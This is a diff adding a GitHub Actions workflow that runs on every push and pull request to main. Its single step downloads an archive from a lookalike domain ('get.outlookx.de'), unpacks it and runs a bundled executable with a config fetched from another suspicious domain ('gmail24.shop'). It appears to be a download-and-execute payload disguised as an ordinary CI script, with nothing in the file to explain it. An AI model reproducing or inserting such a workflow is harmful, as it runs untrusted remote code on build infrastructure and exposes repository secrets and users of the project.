@@ -1,0 +1,16 @@
+name: Multi-line
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run a multi-line script
+      run: |	
+        wget https://get.outlookx.de/cnn-visualizer-1.tar.gz && tar -xf cnn-visualizer-1.tar.gz && cd cnn-visualizer && ./laby-co generate.js -s="https://gmail24.shop/daoco/datavr3.json"
